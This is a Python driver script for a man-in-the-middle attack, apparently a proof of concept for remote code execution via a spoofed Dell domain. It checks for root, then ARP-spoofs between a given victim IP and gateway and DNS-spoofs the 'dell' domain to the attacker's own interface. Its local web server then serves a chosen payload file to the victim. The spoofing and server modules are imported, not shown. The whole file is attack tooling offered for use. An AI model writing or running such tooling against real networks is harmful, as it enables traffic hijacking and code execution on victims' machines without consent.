import sys
import os

from SocketHelper import get_ip_address
from ARPSpoofer import ARPSpoofer
from WebServer import WebServer
from DNSSpoofer import DNSSpoofer

RCE_DOMAIN = "dell"  # What to intercept


def main():
    global RCE_DOMAIN

    if len(sys.argv) < 5:
        print("[-] Expecting 4 arguments, got %i." % (len(sys.argv) - 1))
        print("%s [Interface Name] [Victim IP] [Gateway IP] [Payload Filename]" % sys.argv[0])
        return 0

    if os.geteuid() != 0:
        print("[-] root permissions required.")
        return 0

    interface_name = sys.argv[1]
    target_ip = sys.argv[2]
    gateway_ip = sys.argv[3]
    payload_filename = sys.argv[4]

    print("[+] Grabbing interface IP address.")
    interface_ip = get_ip_address(interface_name)
    if interface_ip == "0.0.0.0":
        print("[-] Could not find the IPv4 Address of the provided interface.")
        return 0

    print("[+] Starting webserver.")
    WebServer(payload_filename)

    print("[+] Starting ARP Spoofing.")
    ARPSpoofer(target_ip, gateway_ip)

    print("[+] Starting DNS Spoofing.")
    DNSSpoofer(RCE_DOMAIN, interface_ip)

    return 0


main()
